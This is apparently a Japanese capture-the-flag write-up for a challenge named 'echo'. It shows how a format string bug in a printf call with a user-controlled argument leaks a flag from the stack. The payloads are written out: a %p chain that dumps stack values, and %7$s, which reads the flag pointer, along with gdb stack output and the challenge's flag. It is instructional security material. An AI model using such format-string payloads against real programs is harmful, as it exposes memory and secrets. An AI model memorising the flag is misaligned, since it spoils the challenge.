# echo writeup

## 問題文

```txt
echo echo

`nc 203.0.113.0 4002`
```

## about

flagがバッファに読み込まれてはいるものの，通常の挙動では表示されません．

バッファのポインタはスタック上にあるので，format string attackを使って読み出します．

## writeup

任意のディスアセンブラ等で確認すると，`main`関数の最初で`flag.txt`を読み込んでいる事がわかるので，ローカルでも適当なflagを用意しておきます．

```txt
echo hogefugapiyo > flag.txt
```

また，`main`関数内では，ユーザが任意のデータを入力できるバッファをそのまま`printf`の第一引数に渡している事からfsaが利用可能である事がわかります．

gdbとfsaを使ってスタックの状態を確認してみます．

`%p`を用いて，スタック上の値を表示します．

```txt
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
0xa,(nil),(nil),0xa,0x7ffffffa,0x5555555592a0,0x555555559480,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x70252c70,(nil),(nil)
```

また，gdbを用いてスタックを見てみると，`0x555555559480`に"hogefugapiyo"(ローカルで用意したダミーのflag)がある事がわかります．

```txt
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd208 --> 0x555555555452 (<main+489>:    mov    edi,0xa)
0008| 0x7fffffffd210 --> 0x5555555592a0 --> 0xfbad2488
0016| 0x7fffffffd218 --> 0x555555559480 ("hogefugapiyo\n")
0024| 0x7fffffffd220 ("%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p")
0032| 0x7fffffffd228 (",%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p")
0040| 0x7fffffffd230 ("p,%p,%p,%p,%p,%p,%p,%p,%p,%p")
0048| 0x7fffffffd238 ("%p,%p,%p,%p,%p,%p,%p")
0056| 0x7fffffffd240 (",%p,%p,%p,%p")
```

ここで，改めてプログラムからの出力を確認すると，`0x555555559480`は7番目である事がわかります．

よって，`%7$s`でこのアドレスの文字列を読み出します．

ローカルで確認すると

```txt
$ ./chall
%7$s
hogefugapiyo

$ cat flag.txt
hogefugapiyo
```

しっかりと`flag.txt`の内容が出力されている事がわかったので，リモートにも同じ文字列を送ります．

## flag

`ISCCTF{th3_f1r5t_4rgum3nt_0f_printf_must_b3_a_str1ng_l1t3r4l}`
